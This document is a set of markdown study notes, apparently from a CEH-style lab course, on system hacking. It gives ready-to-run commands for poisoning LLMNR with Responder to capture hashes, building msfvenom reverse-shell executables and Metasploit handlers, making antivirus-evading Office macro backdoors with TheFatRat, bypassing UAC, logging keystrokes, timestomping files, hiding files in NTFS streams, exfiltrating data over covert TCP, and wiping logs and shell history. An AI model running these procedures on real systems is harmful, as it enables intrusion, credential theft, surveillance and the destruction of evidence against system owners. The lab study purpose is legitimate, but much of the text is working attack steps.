# System Hacking

Four steps:
  - Gaining Access
  - Escalating Privileges
  - Maintaining Access
  - Clearing Logs

Fuzz
  - https://resources.infosecinstitute.com/topic/fuzzer-automation-with-spike/

Buffer overflow
  - https://datacellsolutions.com/2020/09/23/exploiting-a-simple-stack-based-buffer-overflow-vulnerability/
  - https://guif.re/bo#Finding%20a%20JMP%20ESP

## Gain Access

### Perform Active Online Attack to Crack the System’s Password using Responder

**LLMNR** (Link Local Multicast Name Resolution)
- NetBIOS and LLMNR are protocols used to resolve host names on local networks.
- LLMNR is designed for consumer-grade networks in which a domain name system (DNS) server might not exist.

**NBT-NS** 
- NetBIOS Name Service

**Responder.py**：
1. an LLMNR, NBT-NS, and MDNS poisoner.
2. ``` cd Responder ```
3. ``` sudo ./Responder.py -I eth0 ``` Responder starts listening to the network interface for events.
4. Target windows try to open file in the LAN. cmd open "\\CET-TOOLS123"
5. Responder collects the hashes of the logged-in user of the target machine.
6. Logs at "/Responder/logs"

**John the Ripper**:
1. Crack hashes.
2. ``` sudo snap install john-the-ripper ``` Snap is a software packaging and deployment system.
3. ``` sudo john /home/ubuntu/Responder/logs/[Log File Name.txt] ```

### Audit System Passwords
  
 L0phtCrack 

### Find Vulnerabilities on Exploit Sites

https://www.exploit-db.com/
1. SEARCH EDB.
2. Exploit Database Advanced Search.
3. Download the exploit code.

Other tools:
- VulDB (https://vuldb.com).
- MITRE CVE (https://cve.mitre.org).
- Vulners (https://vulners.com).
- CIRCL CVE Search (https://cve.circl.lu).

### Exploit Client-Side Vulnerabilities and Establish a VNC Session
1. VNC (Virtual Network Computing). remotely control another computer.
2. Msfvenom
- ``` msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP of Host Machine] LPORT=444 -o /root/Desktop/Test.exe ```
3. Test.exe is a malicious file for Windows to execute.
4. 
``` 
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST [ip]
msf6 > exploit
```

5. Windows run Test.exe
6. Get connection.
7. ``` meterpreter > upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1 ```
- PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.
8. ``` meterpreter > shell ```
9. In windows shell: ``` powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks" ```
10. Find a vulnerability in VNC
11. exploit VNC vulnerability

### Gain Access to a Remote System using Armitage

Using this tool, you can create sessions, share hosts, capture data, downloaded files, communicate through a shared event log, and run bots to automate pen testing tasks.

### Hack a Windows Machine with a Malicious Office Document using TheFatRat
- compiles malware with a popular payload that can then be executed on Windows, Android, and Mac OSes. 
- an easy way to create backdoors and payloads that can bypass most anti-viruses.

1. ``` #fatrat ```
2. 06 Create Fud Backdoor 1000% with PwnWinds
3. 03 Create exe file with apache + Powershell
4. 07 Create Backdoor For Office with Microsploit
5. |2| The Microsoft Office Macro on Windows
6. Use the payload just created, at /root/Fatrat_Generated/payload.exe
7. Try to deliver the file to the Windows victim.
8. msfconsole. multi/handler -> reverse_tcp

### Perform Buffer Overflow Attack to Gain Access to a Remote System
Steps:
1. Fuzzing the application to determine the crashing of the application
2. Finding the exact location of the crash (called the Offset)
3. Confirming the offset, and control over the flow of execution by Overwriting the Instruction Pointer (EIP)
4. Checking for bad characters
5. Finding the application library with no memory protections
6. And finally, gaining access to the target

[buffer over flow detail](bof.md)

## Privilege Escalation
techniques:
- named pipe impersonation.
- misconfigured service exploitation.
- pivoting.
- relaying.

### Escalate Privileges using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities

1. Generate reverse_tcp malicious exe.
- ``` msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.13 -f exe > Desktop/Exploit.exe ```
- -e: use encoder to avoid bad characters.
- -b: define bad characters.
2. Start handler.
``` 
msfconsole 		
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.13
exploit -j -z
``` 
3. After victim Windows run the exe in step 1.
- ``` sessions -i 1 ```
- Meterpreter shell is launched
- gained access as normal user.
4. Privilege escalation.
- in meterpreter session: ``` upload /home/attacker/Desktop/BeRoot/beRoot.exe ```
5. shell (in meterpreter), open a shell session. run beRoot.exe
6. A result appears, displaying information about
```
####### Service ############
  service names along with their permissions

####### Startup Keys ############
  keys

####### Taskscheduler ############
  writable directories
  locations

####### Check user admin ############
  and other vital data.
```
7. Another method for performing privilege escalation is to bypass the user account control setting (security configuration) using an exploit, and then to escalate the privileges using the Named Pipe Impersonation technique.
8. meterpreter ``` run post/windows/gather/smart_hashdump ```
9. You will not be able to execute commands (such as hashdump, which dumps the user account hashes located in the SAM file, or clearev, which clears the event logs remotely) that require administrative or root privileges.
10. try getsystem to escalate privilege. Not success.
11. try to bypass Windows UAC protection via the FodHelper Registry Key. It is present in Metasploit as a bypassuac_fodhelper exploit.
12. ``` use exploit/windows/local/bypassuac_fodhelper ```
13. ``` exploit ```, ``` getuid ```

### Hack a Windows Machine using Metasploit and Perform Post-Exploitation using Meterpreter

MACE attributes
- While performing post-exploitation activities, an attacker tries to access files to read their contents. Upon doing so, the MACE (modified, accessed, created, entry) attributes immediately change, which indicates to the file user or owner that someone has read or modified the information.
- To leave no trace of these MACE attributes, use the timestomp command to change the attributes as you wish after accessing a file.

In meterpreter:
- ``` timestomp secret.txt -m "02/11/2018 08:10:03" ```
- -m: Change "Modified" value.
- change the Accessed (-a), Created (-c), and Entry Modified (-e) values of a particular file.

``` timestomp secret.txt -v ```
- show timestamp information

In meterpreter:
- ``` search -f [Filename.extension] ```
- capturing all keyboard input from the target system
- ``` keyscan_start ```
- Start keystroke sniffer
- ``` keyscan_dump ```
- Dump captured keystrokes
- ``` idletime ```
- show User has been idle for xxx time

## Maintain Remote Access and Hide Malicious Activities
You can hide malicious programs or files using methods such as rootkits, steganography, and NTFS data streams to maintain access to the target system.

### User System Monitoring and Surveillance using Power Spy

### User System Monitoring and Surveillance using Spytech SpyAgent

### Other spyware:
- ACTIVTrak (https://activtrak.com)
- Veriato Cerebral (https://www.veriato.com) 
- NetVizor (https://www.netvizor.net)
- SoftActivity Monitor (https://www.softactivity.com)

### Hide Files using NTFS Streams
[Hiding Data Using NTFS Alternate Data Streams](https://www.youtube.com/watch?v=S4MBzeni9Eo)

windows cmd: ``` type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe ```
- hide calc.exe inside the readme.txt.
- the readme.txt size has not changed. The legitimate users can not found out.

``` mklink backdoor.exe readme.txt:calc.exe ```
- run backdoor.exe and calculator program will execute.

### Hide Data using White Space Steganography
Windows cmd: ``` snow -C -m "My swiss bank account number is 1532f" -p "magic" readme.txt readme2.txt ```
- magic is the password, but you can type your desired password. readme2.txt is the name of the file that will automatically be created in the same location.
- ``` snow -C -p "magic" readme2.txt. ```

### Image Steganography using OpenStego
OpenStego is an image steganography tool that hides data inside images. It is a Java-based application that supports password-based encryption of data for an additional layer of security. It uses the DES algorithm for data encryption, in conjunction with MD5 hashing to derive the DES key from the password provided.

Other image steganography:
- QuickStego (http://quickcrypto.com)
- SSuite Picsel https://www.ssuitesoft.com)
- CryptaPix (https://www.briggsoft.com)
- gifshuffle (http://www.darkside.com.au)

### Covert Channels using Covert_TCP
The Covert_TCP program manipulates the TCP/IP header of the data packets to send a file one byte at a time from any host to a destination. It can act like a server as well as a client and can be used to hide the data transmitted inside an IP header. This is useful when bypassing firewalls and sending data with legitimate-looking packets that contain no data for sniffers to analyze.

``` 
cc -o covert_tcp covert_tcp.c
	
tcpdump -nvvx port 8888 -i lo
	
./covert_tcp -dest 10.10.10.9 -source 10.10.10.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt		
# start a listener
		
./covert_tcp -dest 10.10.10.9 -source 10.10.10.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/Send/message.txt
# sending the contents of message.txt
``` 
- The message is hidden in headers.

## Clear Log

Various techniques:
- Disable Auditing
- Clearing Logs
- Manipulating Logs
- Covering Tracks on the Network
- Covering Tracks on the OS
- Deleting Files
- Disabling Windows Functionality

### task1: View, Enable, and Clear Audit Policies using Auditpol

Windows 10 CMD: 
``` 
auditpol /get /category:* 
auditpol /set /category:"system","account logon" /success:enable /failure:enable
auditpol /get /category:*
auditpol /clear /y
```
- No Auditing indicates that the system is not logging audit policies.

### Task 2: Clear Windows Machine Logs using Various Utilities

- Clear_Event_Viewer_Logs.bat
- wevtutil
- Cipher
	
Windows CMD: ``` wevtutil el ```
- el | enum-logs lists event log names.
	
Windows CMD:``` wevtutil cl [log_name] ```
- cl | clear-log: clears a log.
- log_name is the name of the log to clear, and ex: is the system, application, and security.

``` cipher /w:[Drive or Folder or File Location] ```
The cipher /w command does not work for files that are smaller than 1 KB.
overwrite data that has been deleted so that it can't be recovered or accessed.
		
**Cipher.exe**
- an in-built Windows command-line tool that can be used to securely delete a chunk of data by overwriting it to prevent its possible recovery. This command also assists in encrypting and decrypting data in NTFS partitions.


### Task 3: Clear Linux Machine Logs using the BASH Shell
	
``` echo $HISTFILE ```
- history file path.
	
``` more ~/.bash_history ```
- check the history of bash commands.
	
``` export HISTSIZE=0 ```
- determines the number of commands to be saved, which will be set to 0.
		
``` history -w ```
- delete the history of the current shell.
		
``` shred ~/.bash_history ```
- making its content unreadable.
		
All in one command
- ``` shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit ```
- This command first shreds the history file, then deletes it, and finally clears the evidence of using this command. After this command, you will exit from the terminal window.
				
		
### Task 4: Clear Windows Machine Logs using CCleaner
	
Other tools:
- DBAN (https://dban.org)
- Privacy Eraser (https://www.cybertronsoft.com)
- Wipe (https://privacyroot.com)
- BleachBit (https://www.bleachbit.org) 
 
